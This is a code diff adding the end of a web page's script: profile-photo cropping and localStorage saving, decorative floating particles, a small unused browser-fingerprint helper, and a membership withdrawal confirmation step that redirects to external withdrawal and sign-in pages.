+            const ctx = canvas.getContext('2d');
+
+            ctx.drawImage(
+                img,
+                (img.width - size) / 2,
+                (img.height - size) / 2,
+                size,
+                size,
+                0,
+                0,
+                size,
+                size
+            );
+
+            const finalImage = canvas.toDataURL('image/png');
+
+            // update avatar instantly
+            profilePhoto.src = finalImage;
+
+            // save permanently
+            localStorage.setItem('profilePhoto', finalImage);
+
+            // Switch label text to show it can now be removed
+            if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
+
+            // close modal
+            cropModal.classList.add('hidden');
+
+            // reset input to prevent re-trigger bugs
+            photoInput.value = '';
+
+            // unlock system shortly after
+            setTimeout(() => {
+                isProcessing = false;
+            }, 300);
+        };
+    };
+
+    reader.readAsDataURL(file);
+});
+
+
+// OPTIONAL: cancel just closes modal (if you still use it)
+if (typeof cancelCrop !== 'undefined' && cancelCrop) {
+    cancelCrop.addEventListener('click', () => {
+        cropModal.classList.add('hidden');
+    });
+}
+
+
+// load saved photo and set correct initial text
+window.addEventListener('DOMContentLoaded', () => {
+    const saved = localStorage.getItem('profilePhoto');
+    if (saved) {
+        profilePhoto.src = saved;
+        if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
+    } else {
+        profilePhoto.src = DEFAULT_AVATAR;
+        if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
+    }
+});
+
+/* Floating particles */
+const bg = document.getElementById('floating-bg');
+const colors = ['#6b2cd8','#9b59b6','#8e44ad'];
+function particle() {
+  const p = document.createElement('div');
+  p.className = 'particle';
+  const s = Math.random()*20+10;
+  p.style.width = s+'px';
+  p.style.height = s+'px';
+  p.style.left = Math.random()*100+'vw';
+  p.style.background = `radial-gradient(circle, ${colors[Math.floor(Math.random()*3)]}, transparent)`;
+  p.style.animationDuration = (Math.random()*20+10)+'s';
+  bg.appendChild(p);
+  setTimeout(()=>p.remove(),30000);
+}
+setInterval(particle,800);
+
+/* Navigation logic */
+function getFingerprint() {
+  return btoa(
+    navigator.userAgent +
+    screen.width + screen.height +
+    navigator.language
+  );
+}
+
+const checkbox = document.getElementById('confirmation');
+const card = document.getElementById('confirmationCard');
+
+// Restore confirmation state on load
+if (localStorage.getItem('membershipConfirmed') === 'true') {
+  checkbox.checked = true;
+}
+
+// Submit button logic
+document.getElementById('submitBtn').onclick = (e) => {
+    e.preventDefault();
+
+    if (!checkbox.checked) {
+
+        // Trigger warning glow immediately
+        card.classList.add('warning');
+
+        // Trigger notification immediately
+        showNotification("Confirmation required to finalize your withdrawal");
+
+        // Remove warning after animation
+        setTimeout(() => {
+            card.classList.remove('warning');
+        }, 2200);
+
+        return;
+    }
+
+
+  // Save confirmation locally
+  localStorage.setItem('membershipConfirmed', 'true');
+
+  // Redirect after submission
+  window.location.href = 'https://link.avalonflow.site/withdrawal';
+};
+
+
+if (localStorage.getItem('membershipConfirmed') === 'true') {
+    window.location.href = "https://membership-signup.avalonflow.site/sign-in";
+}
+</script>
+
+</body>
+</html>
